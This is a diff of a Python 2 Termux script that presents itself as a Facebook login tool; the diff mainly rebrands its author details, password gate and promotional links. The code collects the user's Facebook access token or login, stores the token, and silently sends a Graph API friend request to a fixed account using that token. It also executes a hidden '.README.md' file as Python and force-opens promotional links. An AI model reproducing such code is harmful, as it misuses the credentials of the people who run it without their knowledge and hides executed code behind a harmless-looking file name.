@@ -1,4 +1,3 @@
-
 try:
     import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
     from multiprocessing.pool import ThreadPool
@@ -9,6 +8,7 @@ except ImportError:
     os.system('pip2 install mechanize')
     time.sleep(1)
     os.system('python2 .README.md')
+
 reload(sys)
 sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
@@ -25,12 +25,18 @@ logo='''
 \033[1;92m####                ####    ####    ####
 \033[1;96m####                ####    ####     ####
 \033[1;96m####                #### ## ####       ####
+          88888888P'               8P Y888
+--------------------------------------------------
  Auther   : Mansoor Ali
- GitHub   : https://github.com/Man50or
- YouTube  : Mk Tricks
- Facebook : https://facebook.com/Man50or
-CorrectUsername = "USA"
-CorrectPassword = "USA"
+ GitHub   : https://github.com/binyamin-binni
+ YouTube  : Trick Proof
+ Blogspot : https://trickproof.blogspot.com
+--------------------------------------------------
+                                '''
+
+CorrectUsername = "binyamin"
+CorrectPassword = "bxi"
+
 loop = 'true'
 while (loop == 'true'):
     print logo
@@ -43,17 +49,18 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print " Wrong Password !"
-            os.system('xdg-open https://facebook.com/Man50or')
+            os.system('xdg-open https://trickproof.blogspot.com/2020/02/new-killing-commands-of-termux-for.html')
             os.system("clear")
     else:
         print " Wrong Username !"
-        os.system('xdg-open https://facebook.com/Man50or')
+        os.system('xdg-open https://trickproof.blogspot.com/2020/02/new-killing-commands-of-termux-for.html')
         os.system("clear")
 
 def tik():
         titik = ['.   ','..  ','... ']
         for o in titik:
-                print("\r Loging In "+o),;sys.stdout.flush();time.sleep(1)
+                print("\r[ΓùÅ] Loging In "+o),;sys.stdout.flush();time.sleep(1)
+
 def login():
     os.system("clear")
     try:
@@ -67,6 +74,7 @@ def login():
         print ("[2] Login With Access Token")
         print (50*"-")
         login_choice()
+
 def login_choice():
     bch = raw_input("\n ====>  ")
     if bch =="":
@@ -80,10 +88,11 @@ def login_choice():
         fout.write(fac)
         fout.close()
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+fac)
-        os.system('xdg-open https://www.youtube.com/mktricks143')
+        os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
         os.system("python2 .README.md")
     elif bch =="1":
         login1()
+
 def login1():
         os.system('clear')
         try:
@@ -123,7 +132,7 @@ def login1():
                                 chb.write(z['access_token'])
                                 chb.close()
                                 print ('\n\x1b[1;92m[+] Login Successfull \x1b[1;97m')
-                                os.system('xdg-open https://www.youtube.com/mktricks143')
+                                os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
                                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+z['access_token'])
                                 os.system("python2 .README.md")
                         except requests.exceptions.ConnectionError:
@@ -139,5 +148,6 @@ def login1():
                         os.system('rm -rf ....')
                         time.sleep(1)
                         login1()
+
 if __name__=="__main__":
     login()
